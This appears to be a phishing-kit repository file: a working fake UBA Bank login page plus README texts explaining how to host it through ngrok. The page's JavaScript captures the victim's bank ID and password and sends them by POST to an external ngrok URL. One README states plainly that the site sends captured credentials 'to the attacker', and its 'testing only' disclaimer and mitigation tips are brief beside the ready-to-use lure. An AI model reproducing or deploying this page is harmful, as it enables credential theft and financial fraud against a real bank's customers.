#############################################################################################################################
#############################################################################################################################
# uba_spear_phishing_WIZARD




 <!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>UBA Bank Login</title>
 <style>
 body {
  font-family: sans-serif;
  background-color: #f2f2f2;
 }

 .container {
  width: 400px;
  margin: 50px auto;
  background-color: #fff;
  padding: 20px;
  border-radius: 10px;
  box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
 }

 .logo {
  text-align: center;
  margin-bottom: 20px;
 }

 img {
  width: 150px;
  height: auto;
 }

 .form-group {
  margin-bottom: 10px;
 }

 label {
  display: block;
  margin-bottom: 5px;
 }

 input {
  width: 100%;
  padding: 10px;
  border: 1px solid #ccc;
  border-radius: 5px;
 }

 .btn {
  width: 100%;
  background-color: #007bff;
  color: #fff;
  padding: 10px;
  border: none;
  border-radius: 5px;
  cursor: pointer;
 }

 .btn:hover {
  background-color: #0056b3;
 }
 </style>
</head>
<body>
 <div class="container">
 <div class="logo">
  <img src="https://www.ubabank.com/assets/images/uba-logo.png" alt="UBA Bank Logo">
 </div>

 <h2>UBA Bank Login</h2>

 <form id="loginForm">
  <div class="form-group">
  <label for="bankID">Bank ID Number:</label>
  <input type="text" id="bankID" name="bankID" class="form-control" required>
  </div>

  <div class="form-group">
  <label for="password">Password:</label>
  <input type="password" id="password" name="password" class="form-control" required>
  </div>

  <button type="submit" class="btn">Login</button>
 </form>

 <script>
  const form = document.getElementById('loginForm');

  form.addEventListener('submit', (event) => {
  event.preventDefault();

  const bankID = document.getElementById('bankID').value;
  const password = document.getElementById('password').value;

  const loginData = {
   bankID,
   password
  };

  fetch('https://ngrok-url.com/login', {
   method: 'POST',
   headers: {
   'Content-Type': 'application/json'
   },
   body: JSON.stringify(loginData)
  })
   .then(response => {
   // Handle the response from the server
   console.log('Login data sent successfully');
   })
   .catch(error => {
   // Handle any errors that occur during the fetch
   console.error('Error sending login data:', error);
   });
  });
 </script>
 </div>
</body>
</html>

UBA Bank Phishing Project
Introduction
This project aims to demonstrate the potential security risks of phishing attacks by creating a fake UBA bank login page. Phishing attacks involve tricking users into revealing sensitive information, such as bank account details, by disguising a website or email as a legitimate source.

Impact of Phishing
Phishing attacks can have a devastating impact on individuals and organizations. Victims of phishing attacks may suffer financial losses, identity theft, and damage to their reputation. Organizations may experience data breaches, financial losses, and damage to their reputation.

Steps to Reproduce
Clone this repository.

Install ngrok.

Run ngrok to expose the index.html file to the internet.

ngrok http 8080
Copy the ngrok URL from the terminal.

Open a new browser window and paste the ngrok URL into the address bar.

Enter a fake bank ID and password into the input fields.

Click the "Login" button.

Observation
The fake bank ID and password will be displayed on the ngrok server. This demonstrates how phishing attacks can trick users into revealing sensitive information.

Mitigation
To mitigate the risk of phishing attacks, users should:

Be cautious of clicking on links or opening attachments from unknown senders.
Hover over links to see the real destination URL before clicking.
Look for misspellings and grammatical errors in emails or websites.
Enter sensitive information only on secure websites with "https" in the address bar.
Use strong passwords and enable two-factor authentication.
Keep software up to date, including web browsers and operating systems.
Conclusion
Phishing attacks are a serious threat to cybersecurity. By understanding the impact of phishing and taking steps to mitigate the risk, users can help protect themselves from these attacks.







This is a phishing README file for a UBA bank phishing git repository. This README file is designed to help security testers and vulnerability assessors test the security of UBA bank's website.

To use this README file:

Clone the UBA bank phishing git repository.
Navigate to the cloned repository.
Start ngrok.
Open the README file and copy the ngrok URL.
In a web browser, navigate to the ngrok URL.
You will be redirected to the UBA bank phishing website.
Enter your UBA bank login credentials.
The phishing website will capture your login credentials and send them to the attacker.
Important:

This README file is for security testing and vulnerability assessment purposes only.
Do not use this README file to steal anyone's personal information.
If you find any vulnerabilities in UBA bank's website, please report them to UBA bank immediately.
Additional notes:

##########################################################################################################################
##########################################################################################################################
